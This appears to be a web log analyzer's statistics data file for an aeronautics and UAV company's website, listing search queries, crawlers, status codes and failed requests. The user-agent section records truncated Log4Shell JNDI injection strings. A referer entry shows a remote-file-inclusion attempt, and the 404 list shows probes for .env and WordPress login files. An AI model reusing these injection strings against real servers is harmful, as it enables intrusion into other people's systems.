n	Rq	2	62.259	facebook
n	Rq	1	62.259	college
n	Rq	4	23.174	onboard
n	Rq	3	11.587	gtaeronautics.com
n	Rq	1	62.259	qulificationa
n	Rq	21	18.851	simi
n	Rq	1	62.259	and
n	Rq	5	73.846	flight
n	Rq	17	18.851	at6
n	Rq	1	62.259	xtreme
n	Rq	1	62.259	maintenance
n	Rq	1	62.259	cody
n	Rq	1	62.259	systems
n	Rq	1	62.259	any
n	Rq	1	62.259	tom
n	Rq	1	62.259	payload
n	Rq	2	11.587	gta
n	Rq	2	62.259	granger
n	Rq	8	97.020	extreme
n	Rq	6	85.433	molding
n	Rq	2	62.259	easylifeapp
n	Rq	1	62.259	rating
n	Rq	2	62.259	whitelaw
n	Rq	126	97.020	fashion
n	Rq	2	11.587	ice
n	Rq	2	62.259	http://www.gtaeronautics.com/compnews.html
n	Rq	5	11.587	engineers
n	Rq	3	11.587	composite
n	Rq	1	62.259	skyforce
n	Rq	1	62.259	eengineer
n	Rq	175	42.026	louis
n	Rq	8	62.259	store
n	Rq	4	23.174	starter
n	Rq	14	23.174	cheap
n	Rq	1	62.259	diamond
n	Rq	10	108.607	bme
n	Rq	1	62.259	america2009
n	Rq	7	62.259	content
n	Rq	1	62.259	challenge
n	Rq	2	11.587	aeronautic
n	Rq	1	62.259	piece
n	Rq	1	62.259	how
n	Rq	1	62.259	male
n	Rq	2	11.587	design
n	Rq	2	11.587	flying
n	Rq	1	62.259	carbon
n	Rq	1	62.259	operation
n	Rq	2	62.259	profile
n	Rq	1	62.259	tomas
n	Rq	1	62.259	cia
n	Rq	1	62.259	hummingbird
n	Rq	1	62.259	iron
n	Rq	1	62.259	california
n	Rq	1	62.259	amphibian
n	Rq	1	62.259	110
n	Rq	1	62.259	mentioned
n	Rq	1	62.259	111
n	Rq	1	62.259	over
n	Rq	25	14.528	http://www.gtaeronautics.com/
n	Rq	1	62.259	google.com
n	Rq	1	62.259	fuel
n	Rq	2	62.259	inc
n	Rq	1	62.259	handbag.com
n	Rq	1	62.259	da42
n	Rq	2	11.587	certification
n	Rq	1	62.259	timing
n	Rq	1	62.259	2015
n	Rq	1	62.259	home
n	Rq	1	62.259	aerospacecompanies
n	Rq	1	62.259	anti
n	Rq	1	62.259	ziroli
n	Rq	1	62.259	sketches
n	Rq	5	62.259	purses
n	Rq	1	62.259	downlink
n	Rq	3	62.259	aeronotics
n	Rq	1	62.259	nanotechnology
n	Rq	1	62.259	zephyr
n	Rq	4	62.259	wyoming
n	Rq	2	62.259	technology
n	Rq	3	73.846	companies
n	Rq	1	62.259	muffler
n	Rq	2	62.259	avia
n	Rq	2	62.259	what
n	Rq	145	53.613	valley
n	Rq	1	62.259	microwave
n	Rq	1	62.259	mold
n	Rq	5	23.174	pglm
n	Rq	1	62.259	specialist
n	Rq	23	2.941	drawing
n	Rq	1	62.259	tool
n	Rq	1	62.259	security
n	Rq	6	11.587	prototypes
n	Rq	1	62.259	giant
n	Rq	1	62.259	powell
n	Rq	8	97.020	aerospace
n	Rq	4	23.174	unmanned
n	Rq	34	37.703	aeronautics
n	Rq	1	62.259	radius
n	Rq	1	62.259	zero
n	Rq	1	62.259	tobbot
n	Rq	2	11.587	job
n	Rq	2	11.587	neverfull
n	Rq	1	62.259	onbordstarter
n	Rq	20	23.174	ca
n	Rq	1	11.587	as
n	Rq	13	18.851	at
n	Rq	5	85.433	techniques
n	Rq	1	62.259	does
n	Rq	1	62.259	commercial
n	Rq	1	62.259	www.gt
n	Rq	1	62.259	de
n	Rq	1	62.259	co
n	Rq	1	62.259	speedy
n	Rq	1	62.259	rpas
n	Rq	2	11.587	instrument
n	Rq	1	62.259	do
n	Rq	1	62.259	quotation
n	Rq	3	73.846	training
n	Rq	1	62.259	efi
n	Rq	1	62.259	careers
n	Rq	3	73.846	pilot
n	Rq	9	46.349	bandito
n	Rq	4	23.174	quotes
n	Rq	107	23.174	phone
n	Rq	1	62.259	stations
n	Rq	1	62.259	traing
N	*FR	2013	12	19	00	28
N	*LR	2020	10	14	09	11
N	*f	-200Q	s
N	RQ	9	4130555474	at 6 texan
N	RQ	20	3249190218	www.gtaeronautics.com
N	RQ	20	3084778396	gt aeronautics
N	RQ	3	2808507590	bandito uav
N	RQ	3	2808507590	onboard starter
N	RQ	14	2644095768	aeronautical engineering drawing
N	RQ	1	2367824962	uavs flying over simi valley ca
N	RQ	1	2367824962	gt aeronautics simi valley california
N	RQ	1	2367824962	aeronautical engineer quote
N	RQ	1	2367824962	does aeronautical engineering require drawing?
N	RQ	1	2367824962	how to do gt in engineering drawing
N	RQ	2	2367824962	http://gtaeronautics.com/
N	RQ	1	2367824962	the government college g.t aeronautics
N	RQ	1	2367824962	bme engine
N	RQ	1	2367824962	uas gcs
N	RQ	1	2367824962	http://www.gtaeronautics.com/indnews.html
N	RQ	92	2367824962	semalt.com
N	RQ	1	2367824962	aero iron mentioned nanotechnology hummingbird uav
N	RQ	1	2367824962	basic fiberglass techniques
N	RQ	1	2367824962	http://gtaeronautics.com/indnews.html
N	RQ	1	2367824962	finnemeccia co
N	RQ	2	2367824962	drawing for customer satisfaction
N	RQ	1	2367824962	cheap louis vuitton speedy handbag.com
N	RQ	1	2367824962	at 6
N	RQ	1	2367824962	quotation specialist engineer drawings
N	RQ	1	2367824962	challenge xtreme 111 piece mechanics tool kit
N	RQ	1	2367824962	uav commercial crew stations
N	RQ	1	2367824962	da42 mpp microwave downlink bandwidth
N	RQ	1	2367824962	anti ice de ice qinetiq zephyr
N	RQ	4	2367824962	louis%20vuitton%20fashion%20valley%20phone%20number
N	RQ	1	2367824962	faa uas pilot certification
N	RQ	1	2367824962	any flying crews in gta
N	RQ	1	2367824962	aerospace drawing
N	RQ	1	2367824962	fiber glass molding job
N	RQ	1	2367824962	aircraft design consultant
N	RQ	1	2367824962	www.gt airplane.com
N	RQ	3	2367824962	gt in aeronotics
N	RQ	1	2367824962	tom rullman
N	RQ	1	2367824962	gt aeronautics simi valley ca
N	RQ	1	2367824962	drone base in simi valley
N	RQ	1	2367824962	fiberglass mold making techniques
N	RQ	1	2367824962	rpa instrument qualification faa instrument rating
N	RQ	1	2367824962	extreme bme
N	RQ	1	2367824962	uas faa maintenance
N	RQ	1	2367824962	louis vuitton neverfull
N	RQ	1	2367824962	fiberglass techniques
N	RQ	1	2367824962	aircraft companies in simi valley
N	RQ	1	2367824962	custom fiberglass moldings
N	RQ	11	2367824962	louis vuitton luggage cheap
N	RQ	1	2367824962	anything
N	RQ	1	2367824962	aeronautical engineering sketches
N	RQ	1	2367824962	gtaeronautics.com
N	RQ	1	2367824962	giant scale ziroli at 6
N	RQ	9	2367824962	outlet louis vuitton handbags
N	RQ	1	2367824962	cowling drawing
N	RQ	1	2367824962	mitsubishi zero
N	RQ	1	2367824962	powell wy gt aeronautics
N	RQ	2	2367824962	what is gt in basic engineering drawing
N	RQ	2	2367824962	composite molding
N	RQ	1	2367824962	aeronautics in simi valley and security work
N	RQ	3	2367824962	gt aeronautics llc jobs
N	RQ	1	2367824962	crew flight gta
N	RQ	1	2367824962	110cc engine timing
N	RQ	1	2367824962	aeronautical engineer quotes
N	RQ	2	2367824962	http://www.gtaeronautics.com/compnews.html
N	RQ	4	2367824962	wyoming flight engineers
N	RQ	1	2367824962	a t 6
N	RQ	1	2367824962	gt aeronautics unmanned air
N	RQ	1	2367824962	fia gt composite tooling
N	RQ	1	2367824962	uas pilot certification
N	RQ	1	2367824962	quotes on aeronautical engineers
N	RQ	1	2367824962	payload for diamond northrop twin engie aircraft
N	RQ	7	2367824962	content
N	RQ	1	2367824962	bme 110
N	RQ	1	2367824962	thomas w rullman gt aeronautics
N	RQ	1	2367824962	luggages for sale
N	RQ	2	2367824962	easylifeapp profile
N	RQ	2	2367824962	simi gt
N	RQ	1	2367824962	mq1 design fuel
N	RQ	1	2367824962	airplane as always cia america2009
N	RQ	1	2367824962	eengineer drawing home
N	RQ	1	2367824962	heavy equipment operator jobs
N	RQ	1	2367824962	aero space drone simi valley
N	RQ	1	2367824962	cheap louis vuitton luggage
N	RQ	1	2367824962	2 stroke electric onboard starter
N	RQ	1	2367824962	skyforce observer mk3
N	RQ	1	2367824962	simi valley unmanned aircraft
N	RQ	2	2367824962	granger whitelaw avia
N	RQ	1	2367824962	louis vuitton fashion valley neverfull
N	RQ	1	2367824962	louis vuitton job opportunities
N	RQ	1	2367824962	google.com
N	RQ	1	2367824962	uas operation training method
N	RQ	2	2367824962	wmaid.com explore gtaeronautics.com
N	RQ	1	2367824962	custum muffler 110cc
N	RQ	1	2367824962	glass manufacturing drawings
N	RQ	1	2367824962	electric motors x male uav x sale
N	RQ	1	2367824962	aerospacecompanies in simi valley
N	RQ	1	2367824962	fiberglass molding
N	RQ	2	2367824962	aeronautical technology inc
N	RQ	1	2367824962	taranis ucav
N	RQ	1	2367824962	vegas drone uav show december 2015
N	RQ	1	2367824962	uav companies in simi valley
N	RQ	1	2367824962	unmanned aircraft systems pilot training
N	RQ	2	2367824962	installerex facebook
N	RQ	3	2367824962	texan at6 photos
N	RQ	1	2367824962	aeronautic engineer
N	RQ	30	2367824962	designer handbags outlet sale
N	RQ	1	2367824962	rpas qulificationa traing with faa
N	RQ	1	2367824962	faa uav training
N	RQ	1	2367824962	uav companies simi valley
N	RQ	5	2367824962	louis vuitton purses outlet
N	RQ	1	2367824962	aeronautics
N	RQ	1	2367824962	cheap louis vuitton luggage outlet
N	RQ	1	2367824962	gt aeronautics tomas rullman
N	RQ	1	2367824962	tobbot
N	RQ	1	2367824962	radius tdw efi fuze
N	RQ	8	2367824962	manufacturing equipment store in simi valley
N	RQ	1	2367824962	aeronautic engineer quotes
N	RQ	1	2367824962	onbordstarter
N	RQ	1	2367824962	rotax amphibian unmanned china
N	RQ	1	2367824962	aeronautical engineering quotes
N	RQ	1	2367824962	drawing aircraft engineering
N	RQ	1	2367824962	gt aeronautics careers
N	RQ	1	2367824962	gt aeronautics bandito
N	RQ	1	2367824962	cody wy carbon fiber
N	RQ	8	1762730512	at6 texan
N	RQ	7	1322047884	bme extreme
N	RQ	7	1322047884	aerospace engineering drawings
N	RQ	6	881365256	texan at6
N	RQ	5	881365256	bandito pglm
N	RQ	25	552541612	http://www.gtaeronautics.com/
N	RQ	2	440682628	fiberglass molding techniques
N	RQ	6	440682628	manufacturing aeronautical prototypes
N	RQ	19	440682628	louis vuitton luggage outlet
N	RQ	10	440682628	louis vuitton fashion valley phone
N	RQ	97	440682628	louis vuitton fashion valley phone number
N	RQ	2	440682628	texan at 6
N	RQ	18	440682628	louis vuitton fashion valley ca
B	*f	-40R	r
B	Rb	62571	2.898	Mozilla/5.0 (compatible; AhrefsBot/7.0;  http://ahrefs.com/robot/)
B	Rb	51378	1.116	Sogou web spider/4.0( http://www.sogou.com/docs/help/webmasters.htm#07)
B	Rb	46320	1.638	ZoominfoBot (zoominfobot at zoominfo dot com)
B	Rb	40898	4.266	Mozilla/5.0 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)
B	Rb	32541	1.266	Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)
B	Rb	28183	0.000	Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
B	Rb	16284	0.954	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
B	Rb	12964	1.355	Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)
B	Rb	12721	2.168	Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1736.0 Safari/537.36
B	Rb	12047	1.399	Mozilla/5.0 (compatible; YandexBot/3.0;  http://yandex.com/bots)
B	Rb	12036	0.000	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
B	Rb	11125	0.266	Googlebot-Image/1.0
B	Rb	10588	0.689	Mozilla/5.0 (compatible; Baiduspider/2.0;  http://www.baidu.com/search/spider.html)
B	Rb	10308	0.616	Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
B	Rb	9225	0.435	Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36
B	Rb	8061	0.886	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
B	Rb	8008	0.333	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1;  http://www.apple.com/go/applebot)
B	Rb	7480	0.408	Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
B	Rb	7181	0.200	Mozilla/4.0 (compatible;)
B	Rb	7115	0.000	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
B	Rb	7101	0.210	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
B	Rb	7090	0.067	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
B	Rb	6482	0.307	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
B	Rb	6164	0.044	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
B	Rb	6152	0.345	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
B	Rb	6079	0.224	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
B	Rb	5934	0.000	Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
B	Rb	5892	0.190	Mozilla/5.0 (compatible; BLEXBot/1.0;  http://webmeup-crawler.com/)
B	Rb	5848	0.260	Sosospider ( http://help.soso.com/webspider.htm)
B	Rb	5436	0.296	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.2) Gecko/20040804 Netscape/7.2 (ax)
B	Rb	5308	0.127	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
B	Rb	5249	0.315	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
B	Rb	5101	0.424	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
B	Rb	4953	0.479	PRurl
B	Rb	4893	0.118	Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
B	Rb	4836	0.000	Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
B	Rb	4446	0.173	Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)
B	Rb	4368	0.034	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
B	Rb	4312	0.449	Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b
B	Rb	4200	0.400	Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0
B	Rb	962803	74.643	[not listed: 21742]
b	*f	-15Q	s
b	lRQq	1	30	4130555474	444.558	LWP::Simple
b	lRQq	2	17	3249190218	349.700	LWP::Simple/6
b	lRQq	2	13	881365256	94.858	LWP::Simple/5
b	lRQq	1	87	4130555474	444.558	Googlebot
b	lRQq	2	63	1322047884	142.288	Googlebot/2
b	lRQq	2	7	440682628	47.429	Googlebot/Nutch-2
b	lRQq	1	50	4130555474	444.558	okhttp
b	lRQq	2	1	2367824962	254.841	okhttp/2
b	lRQq	2	35	1322047884	142.288	okhttp/3
b	lRQq	2	14	440682628	47.429	okhttp/4
b	lRQq	1	394	3966143652	426.863	Wget
b	lRQq	2	394	3966143652	426.863	Wget/1
b	lRQq	1	148	3966143652	426.863	User-Agent: Mozilla
b	lRQq	2	148	3966143652	426.863	User-Agent: Mozilla/5
b	lRQq	1	11	3689872846	397.129	WhatsApp
b	lRQq	2	11	3689872846	397.129	WhatsApp/2
b	lRQq	1	27	3689872846	397.129	${${lower:jndi}:${lower:rmi}:
b	lRQq	2	10	2367824962	254.841	${${lower:jndi}:${lower:rmi}://188
b	lRQq	2	3	2367824962	254.841	${${lower:jndi}:${lower:rmi}://185
b	lRQq	2	4	2367824962	254.841	${${lower:jndi}:${lower:rmi}://167
b	lRQq	2	6	440682628	47.429	${${lower:jndi}:${lower:rmi}://144
b	lRQq	2	4	440682628	47.429	${${lower:jndi}:${lower:rmi}://51
b	lRQq	1	43	3689872846	397.129	com.google.android.apps.searchlite
b	lRQq	2	25	2367824962	254.841	com.google.android.apps.searchlite/763965
b	lRQq	2	6	2367824962	254.841	com.google.android.apps.searchlite/784321
b	lRQq	2	1	2367824962	254.841	com.google.android.apps.searchlite/677613
b	lRQq	2	6	2367824962	254.841	com.google.android.apps.searchlite/602374
b	lRQq	2	3	2367824962	254.841	com.google.android.apps.searchlite/426028
b	lRQq	2	2	440682628	47.429	com.google.android.apps.searchlite/484573
b	lRQq	1	122	3689872846	397.129	MSIE or
b	lRQq	1	309	3637320008	391.473	Dalvik
b	lRQq	2	282	3966143652	426.863	Dalvik/2
b	lRQq	2	27	3966143652	426.863	Dalvik/1
b	lRQq	1	2249	3361049202	361.739	libwww-perl
b	lRQq	2	1794	4130555474	444.558	libwww-perl/6
b	lRQq	2	455	3525461024	379.434	libwww-perl/5
b	lRQq	1	232	3249190218	349.700	DomainCrawler
b	lRQq	2	134	2367824962	254.841	DomainCrawler/3
b	lRQq	2	83	440682628	47.429	DomainCrawler/2
b	lRQq	2	15	440682628	47.429	DomainCrawler/1
b	lRQq	1	16	3249190218	349.700	Windows-Media-Player
b	lRQq	2	11	2808507590	302.270	Windows-Media-Player/11
b	lRQq	2	4	2367824962	254.841	Windows-Media-Player/10
b	lRQq	2	1	2367824962	254.841	Windows-Media-Player/9
b	lRQq	1	27	3249190218	349.700	W3C_Validator
b	lRQq	2	27	3249190218	349.700	W3C_Validator/1
b	lRQq	1	204	3249190218	349.700	Dispatch
b	lRQq	2	204	3249190218	349.700	Dispatch/0
b	lRQq	1	1475732	1685136945	181.366	[not listed: 921]
p	*f	0Q	s
p	lR	1	721872	Windows
p	lR	2	309544	Unknown Windows
p	lR	2	149852	Windows NT
p	lR	2	2233	Windows 95
p	lR	2	246185	Windows XP
p	lR	2	408	Windows CE
p	lR	2	2367	Windows 98
p	lR	2	9469	Windows 2000
p	lR	2	384	Windows 3.1
p	lR	2	1430	Windows ME
p	lR	1	198902	Known robots
p	lR	1	303594	OS unknown
p	lR	1	143782	Macintosh
p	lR	2	139337	Unknown Macintosh
p	lR	2	1203	Macintosh 68k
p	lR	2	3242	Macintosh PowerPC
p	lR	1	111448	Unix
p	lR	2	108868	Linux
p	lR	2	2495	Other Unix
p	lR	2	22	SunOS
p	lR	2	60	BSD
p	lR	2	3	HP-UX
p	lR	1	16	WebTV
p	lR	1	13	BeOS
p	lR	1	47	OS/2
p	lR	1	7	Amiga
i	*f	0R	s
i	lRc	1	778954	0.000	[root directory]
i	lRc	1	493587	0.000	/images/
i	lRc	1	140283	0.000	/js/
i	lRc	1	72388	0.000	/css/
i	lRc	1	4677	0.000	/uploads/
i	lRc	1	865	0.000	/videos/
i	lRc	1	541	0.000	/client/
i	lRc	1	1	0.000	/cgi-bin/
i	lRc	1	236	0.000	/dev/
i	lRc	2	24	0.000	/dev/css/
i	lRc	2	46	0.000	/dev/js/
i	lRc	2	81	0.000	/dev/images/
i	lRc	1	1	0.000	/secure/
i	lRc	1	74	0.000	/stats/
r	*f	0.050000%S	s
r	lRSc	1	19657	99	0.000	/links.html
r	lRSc	1	34156	46	0.000	/aboutus.html
r	lRSc	1	30173	41	0.000	/compnews.html
r	lRSc	1	22081	32	0.000	/consultinga.html
r	lRSc	1	18360	32	0.000	/pna.html
r	lRSc	1	9379	31	0.000	/gt380+rpas.html
r	lRSc	1	21032	31	0.000	/cfmt.html
r	lRSc	1	4713	31	0.000	/gt100hl+rpas.html
r	lRSc	1	9335	29	0.000	/gt1500+rpas.html
r	lRSc	1	26191	28	0.000	/uasfc.html
r	lRSc	1	23890	28	0.000	/contactus.html
r	lRSc	1	13172	28	0.000	/sru.html
r	lRSc	1	21480	27	0.000	/cct&m.html
r	lRSc	1	16364	26	0.000	/faq.html
r	lRSc	1	18123	25	0.000	/indevents.html
r	lRSc	1	8834	25	0.000	/gt50t+rpas.html
r	lRSc	1	18567	18	0.000	/employment.html
r	lRSc	1	11820	14	0.000	/rd.html
r	lRSc	1	29123	11	0.000	/indnews.html
r	lRSc	2	141	0	0.000	/indnews.html?referer=www.clickfind.com.au/wp-login.php
r	lRSc	2	1	0	0.000	/indnews.html?referer=top1.co.pl
r	lRSc	2	1	0	0.000	/indnews.html?referer=www.clickfind.com.au//wp-content/themes/busybee/thumb.php?src=http://blogger.com.opontodaarte.com.br/java.php
r	lRSc	1	4176	3	0.000	/gtatexan.html
r	lRSc	1	559	2	0.000	/uploads/idrone-pressrelease-powell-version220119.pdf
r	lRSc	1	428	2	0.000	/uploads/2022wydronefestflyer+rev2.pdf
r	lRSc	1	4359	2	0.000	/uavengines.html
r	lRSc	1	447	1	0.000	/uploads/droneexpojan2022+(1).pdf
r	lRSc	1	4111	1	0.000	/banditomav.html
r	lRSc	1	555	1	0.000	/uploads/bighornbasindronefestivalflyer-v2-220110.pdf
r	lRSc	1	3887	1	0.000	/bandituas.html
r	lRSc	1	1	0	0.000	/client/bandito timeline2007.html
r	lRSc	1	2	0	0.000	/client/bandit+timeline2004.html
r	lRSc	1	1	0	0.000	/stats/quick.html
r	lRSc	1	1	0	0.000	/404.htm
r	lRSc	1	12	0	0.000	/client/gta010707002.html
r	lRSc	1	72	0	0.000	/client/bandito+development.html
r	lRSc	1	135	0	0.000	/client/welcome.html
r	lRSc	1	3	0	0.000	/client/gta021305001.html
r	lRSc	1	1	0	0.000	/stats/browserrep.html
r	lRSc	1	741	0	0.000	/gt50t rpas.html
r	lRSc	1	5	0	0.000	/client/gta012405001.html
r	lRSc	1	2	0	0.000	/dev/contactus.html
r	lRSc	1	4	0	0.000	/stats/general.html
r	lRSc	1	1	0	0.000	/stats/dailyrep.html
r	lRSc	1	1	0	0.000	/dev/aboutus.html
r	lRSc	1	18	0	0.000	/client/tacamo+development.html
r	lRSc	1	1	0	0.000	/client/bandit development.html
r	lRSc	1	17	0	0.000	/client/bandit+timeline2008.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2005.html
r	lRSc	1	23	0	0.000	/client/projectbids.html
r	lRSc	1	1	0	0.000	/stats/host.html
r	lRSc	1	11	0	0.000	/client/rq2+outlaw.html
r	lRSc	1	1	0	0.000	/client/bandit timeline2008.html
r	lRSc	1	20	0	0.000	/client/clientpna.html
r	lRSc	1	15	0	0.000	/client/bandit.html
r	lRSc	1	2	0	0.000	/stats/default.asp
r	lRSc	1	21	0	0.000	/index.htm
r	lRSc	1	1	0	0.000	/cgi-bin/testms.pl
r	lRSc	1	981	0	0.000	/gtamt.html
r	lRSc	1	14	0	0.000	/client/rq1+bandit.html
r	lRSc	1	2253	0	0.000	/gt1500 rpas.html
r	lRSc	1	6	0	0.000	/client/gta021305002.html
r	lRSc	1	4	0	0.000	/client/gta121004001.html
r	lRSc	1	24	0	0.000	/client/tacamo.html
r	lRSc	1	30	0	0.000	/client/mgqgcyat.asp
r	lRSc	1	456	0	0.000	/uploads/big+horn+basin+drone+festival+event+schedule.pdf
r	lRSc	1	1	0	0.000	/dev/client.cgi
r	lRSc	1	18702	0	0.000	/default.asp
r	lRSc	1	1666	0	0.000	/gt380 rpas.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2006.html
r	lRSc	1	16	0	0.000	/client/rq3+bandito.html
r	lRSc	1	1	0	0.000	/dev/uasfc.html
r	lRSc	1	229	0	0.000	/client.cgi
r	lRSc	1	71	0	0.000	/client/bandit+development.html
r	lRSc	1	2	0	0.000	/client/bandito development.html
r	lRSc	1	2	0	0.000	/stats/yearly.html
r	lRSc	1	2	0	0.000	/stats/domain.html
r	lRSc	1	1	0	0.000	/stats/monthly.html
r	lRSc	1	2	0	0.000	/stats/weekly.html
r	lRSc	1	8	0	0.000	/client/gta010707001.html
r	lRSc	1	3749	0	0.000	/bidspridpass.html
r	lRSc	1	6356	0	0.000	/pridpass.html
r	lRSc	1	12	0	0.000	/client/bandito.html
r	lRSc	1	1	0	0.000	/dev/pna.html
r	lRSc	1	1	0	0.000	/client/tacamo development.html
r	lRSc	1	4	0	0.000	/stats/index.htm
r	lRSc	1	4	0	0.000	/stats/nav.html
r	lRSc	1	1	0	0.000	/stats/quarterly.html
r	lRSc	1	2	0	0.000	/stats/directory.html
r	lRSc	1	2	0	0.000	/stats/organisation.html
r	lRSc	1	8	0	0.000	/client/bandito+timeline2007.html
r	lRSc	1	7	0	0.000	/client/bandit+timeline2007.html
r	lRSc	1	1	0	0.000	/dev/pridpass.html
t	*f	0.100000%B	b
t	lRb	1	423904	43.756	.jpg  [JPEG graphics]
t	lRb	1	389270	26.229	.html [Hypertext Markup Language]
t	lRb	1	345975	18.517	[directories]
t	lRb	1	2232	5.242	.mp4
t	lRb	1	778	2.157	.wmv
t	lRb	1	87	2.118	.mpg  [MPEG movie]
t	lRb	1	18734	0.911	.asp  [Active Server REQUESTS]
t	lRb	1	69788	0.296	.gif  [GIF graphics]
t	lRb	1	140329	0.254	.js  [JavaScript code]
t	lRb	1	72404	0.225	.css  [Cascading Style Sheets]
t	lRb	1	2445	0.210	.pdf  [Adobe Portable Document Format]
t	lRb	1	25661	0.084	[not listed: 6]
z	*FR	2023	04	05	20	41
z	*LR	2023	05	09	10	03
z	ScR	0	0.000	84837	0
z	ScR	0	0.000	0	1b-  10b
z	ScR	0	0.000	0	11b- 100b
z	ScR	0	0.000	85122	101b-  1kb
z	ScR	0	0.000	509907	1kb- 10kb
z	ScR	0	0.000	352085	10kb-100kb
z	ScR	0	0.000	104639	100kb-  1Mb
z	ScR	0	0.000	4584	1Mb- 10Mb
z	ScR	0	0.000	55	10Mb-100Mb
z	ScR	0	0.000	13	100Mb-  1Gb
c	*FR	2014	03	02	13	52
c	*LR	2023	11	05	04	46
c	*f	0R	a
c	R	1394287	200 OK
c	R	8160	206 Partial content
c	R	141	301 Document moved permanently
c	R	77	302 Document found elsewhere
c	R	89160	304 Not modified since last retrieval
c	R	970	400 Bad request
c	R	207	401 Authentication required
c	R	314	403 Access forbidden
c	R	543225	404 Document not found
c	R	1925	405 Method not allowed
c	R	808	406 Document not acceptable to client
c	R	141	416 Requested range not valid
c	R	624	500 Internal server error
c	R	128	501 Request type not supported
I	*FR	2007	12	11	00	52
I	*LR	2023	11	05	04	34
I	*f	-30S	s
I	lRS	1	133453	194	/robots.txt
I	lRS	1	6420	14	/ads.txt
I	lRS	1	2115	11	/
I	lRS	1	1184	7	/videos/bandito+004+flt+8+clip+092508.wmv
I	lRS	1	377	7	/admin/
I	lRS	1	143	7	/simple.php
I	lRS	1	3954	6	/xmlrpc.php
I	lRS	1	2590	4	/.env
I	lRS	1	1080	3	/wp1/wp-includes/wlwmanifest.xml
I	lRS	1	1042	3	/shop/wp-includes/wlwmanifest.xml
I	lRS	1	937	3	/2019/wp-includes/wlwmanifest.xml
I	lRS	1	1201	3	/wp-includes/wlwmanifest.xml
I	lRS	1	1084	3	/web/wp-includes/wlwmanifest.xml
I	lRS	1	917	3	/sito/wp-includes/wlwmanifest.xml
I	lRS	1	1224	3	/blog/wp-includes/wlwmanifest.xml
I	lRS	1	8024	3	/wp-login.php
I	lRS	1	919	3	/website/wp-includes/wlwmanifest.xml
I	lRS	1	919	3	/news/wp-includes/wlwmanifest.xml
I	lRS	1	41	3	/wp-head.php
I	lRS	1	861	3	/admin.php
I	lRS	1	1223	3	/wordpress/wp-includes/wlwmanifest.xml
I	lRS	1	1224	3	/wp/wp-includes/wlwmanifest.xml
I	lRS	1	1221	3	/cms/wp-includes/wlwmanifest.xml
I	lRS	1	920	3	/wp2/wp-includes/wlwmanifest.xml
I	lRS	1	1081	3	/test/wp-includes/wlwmanifest.xml
I	lRS	1	1224	3	/site/wp-includes/wlwmanifest.xml
I	lRS	1	39	2	/class.api.php
I	lRS	1	38	2	/wp-content/plugins/press/wp-class.php
I	lRS	1	233	2	/sitemaps.xml
I	lRS	1	617	2	/2018/wp-includes/wlwmanifest.xml
I	lRS	1	371964	265	[not listed: 26366]
L	*FR	2007	12	11	00	52
L	*LR	2023	11	05	04	34
L	*f	-20S	s
L	RS	648	162	199.244.49.19
L	RS	36	36	156.146.59.167
L	RS	323	17	92.205.107.64
